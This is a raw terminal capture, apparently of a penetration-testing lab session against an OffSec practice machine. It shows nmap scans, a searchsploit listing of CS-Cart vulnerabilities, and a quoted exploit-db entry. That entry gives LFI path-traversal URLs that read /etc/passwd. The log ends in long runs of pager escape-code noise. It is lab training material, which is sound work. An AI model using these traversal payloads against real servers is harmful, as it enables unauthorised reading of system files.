@@ -1,0 +1,529 @@
+
+=== SESSION START: 2026-08-25 10:18:24 | Box: Payday | IP: 192.168.119.39 | Platform: Offsec ===
+
+$ [10:20:18] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-25 10:20:18 ===
+
+$ [10:21:07] sudo nmap -p- --min-rate 5000 -oA full_nmap $BoxIP
+
+=== SESSION RECONNECT: 2026-08-25 10:21:25 ===
+
+$ [10:21:30] flameshot
+
+$ [10:23:18] sudo nmap -p 22,80,110,139,143,445,993,995 -sV -sC -oA service_nmap $BoxIP
+Script started on 2026-08-25 10:20:18+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="238" LINES="53"]
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:20:18][39m $ [K[?1h=[?2004hsudo nmap -p- --min-rate 5000 -oA full_nmap $BoxIP[50D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[41C[?1l>[?2004l
+[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 10:21 +0100
+Nmap scan report for 192.168.119.39
+Host is up (0.011s latency).
+Not shown: 65527 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+110/tcp open  pop3
+139/tcp open  netbios-ssn
+143/tcp open  imap
+445/tcp open  microsoft-ds
+993/tcp open  imaps
+995/tcp open  pop3s
+
+Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:21:17][39m $ [K[?1h=[?2004hsudo nmap -p 22,80,110,139,143,445,993,995 -sV -sC -oA service_nmap $BoxIP[74D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[65C[?1l>[?2004l
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 10:23 +0100
+Nmap scan report for 192.168.119.39
+Host is up (0.014s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
+|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
+80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+|_http-title: CS-Cart. Powerful PHP shopping cart software
+110/tcp open  pop3        Dovecot pop3d
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_pop3-capabilities: CAPA PIPELINING STLS RESP-CODES UIDL TOP SASL
+|_ssl-date: 2026-08-25T09:23:36+00:00; +4s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: completed Capability OK LOGINDISABLEDA0001 STARTTLS SASL-IR NAMESPACE IDLE CHILDREN LOGIN-REFERRALS IMAP4rev1 LITERAL+ THREAD=REFERENCES SORT UNSELECT MULTIAPPEND
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_ssl-date: 2026-08-25T09:23:36+00:00; +4s from scanner time.
+445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
+993/tcp open  ssl/imap    Dovecot imapd
+|_ssl-date: 2026-08-25T09:23:36+00:00; +5s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_imap-ca
+$ [10:24:06] shot nmap-service
+
+$ [10:26:02] searchsploit cs-cart
+pabilities: completed Capability OK IMAP4rev1 SASL-IR NAMESPACE IDLE CHILDREN LOGIN-REFERRALS AUTH=PLAINA0001 LITERAL+ THREAD=REFERENCES SORT UNSELECT MULTIAPPEND
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+995/tcp open  ssl/pop3    Dovecot pop3d
+|_ssl-date: 2026-08-25T09:23:36+00:00; +5s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_pop3-capabilities: CAPA USER PIPELINING RESP-CODES UIDL TOP SASL(PLAIN)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.26a)
+|   Computer name: payday
+|   NetBIOS computer name: 
+|   Domain name: 
+|   FQDN: payday
+|_  System time: 2026-08-25T05:23:35-04:00
+|_clock-skew: mean: 40m04s, deviation: 1h37m59s, median: 3s
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:23:32][39m $ [K[?1h=[?2004hs[4ms[24m[4ms[24m[90mudo nmap -p 22,80,110,139,143,445,993,995 -sV -sC -oA service_nmap $BoxIP[39m[73D[4ms[39m[4mh[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [72D[24m[32ms[24m[32mh[39m[32ms[32mh[32mo[39m[1m[31ms[1m[31mh[1m[31mo[0m[39m[1m[31mo[1m[31mt[0m[39m[0m[32ms[0m[32mh[0m[32mo[0m[32mt[39m[32mt[32m [39m[32mt[39m[39m n[4mn[24m[4mn[4mm[24m[4mm[4ma[24m[4ma[4mp[24m[4mp[4m-[24m[24mn[24mm[24ma[24mp[24m-service[?1l>[?2004l
+[+] Screenshot: /home/kali/Platforms/Offsec/Payday/screenshots/nmap-service.png
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:24:06][39m $ [K[?1h=[?2004hsearchsploit cs-cart[20D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[8C[?1l>[?2004l
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                                  
+$ [10:27:50] searchsploit -x php/webapps/48890.txt
+                            |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+[01;31m[KCS-Cart[m[K - Multiple SQL Injections                                                                                                                                                                           | php/webapps/27030.txt
+[01;31m[KCS-Cart[m[K 1.3.2 - 'index.php' Cross-Site Scripting                                                                                                                                                            | php/webapps/31443.txt
+[01;31m[KCS-Cart[m[K 1.3.3 - 'classes_dir' LFI                                                                                                                                                                           | php/webapps/48890.txt
+[01;31m[KCS-Cart[m[K 1.3.3 - 'classes_dir' Remote File Inclusion                                                                                                                                                         | php/webapps/1872.txt
+[01;31m[KCS-Cart[m[K 1.3.3 - 'install.php' Cross-Site Scripting                                                                                                                                                          | multiple/webapps/14962.txt
+[01;31m[KCS-Cart[m[K 1.3.3 - authenticated RCE                                                                                                                                                                           | php/webapps/48891.txt
+[01;31m[KCS-Cart[m[K 1.3.5 - Authentication Bypass                                                                                                                                                                       | php/webapps/6352.txt
+[01;31m[KCS-Cart[m[K 2.0.0 Beta 3 - 'Product_ID' SQL Injection                                                                                                                                                           | php/webapps/8184.txt
+[01;31m[KCS-Cart[m[K 2.0.5 - 'reward_points.post.php' SQL Injection                                                                                                                                                      | php/webapps/33146.txt
+[01;31m[KCS-Cart[m[K 2.2.1 - 'products.php' SQL Injection                                                                                                                                                                | php/webapps/36093.txt
+[01;31m[KCS-Cart[m[K 4.2.4 - Cross-Site Request Forgery                                                                                                                                                                  | php/webapps/36358.html
+[01;31m[KCS-Cart[m[K 4.3.10 - XML External Entity Injection                                                                                                                                                              | php/webapps/40770.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:26:02][39m $ [K[?1h=[?2004hsearchsploit -x php/webapps/48890.txt[37D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[25C[?1l>[?2004l
+  Exploit: CS-Cart 1.3.3 - 'classes_dir' LFI
+      URL: https://www.exploit-db.com/exploits/48890
+     Path: /usr/share/exploitdb/exploits/php/webapps/48890.txt
+    Codes: N/A
+ Verified: False
+File Type: ASCII text
+[?1049h[22;0;0t[53;1H[?1h=# Exploit Title: CS-Cart unauthenticated LFI
+# Date: 2020-09-22
+# Exploit Author:  0xmmnbassel
+# Vendor Homepage: https://www.cs-cart.com/e-commerce-platform.html
+# Tested at: ver. 1.3.4
+# Vulnerability Type: unauthenticated LFI
+
+
+http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[evil_scripts]%00
+example:
+http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
+http://www.site.com/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
+[7m/usr/share/exploitdb/exploits/php/webapps/48890.txt (END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+# Exploit Title: CS-Cart unauthenticated LFI
+# Date: 2020-09-22
+# Exploit Author:  0xmmnbassel
+# Vendor Homepage: https://www.cs-cart.com/e-commerce-platform.html
+# Tested at: ver. 1.3.4
+# Vulnerability Type: unauthenticated LFI
+
+
+http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[evil_scripts]%00
+example:
+http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
+http://www.site.com/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K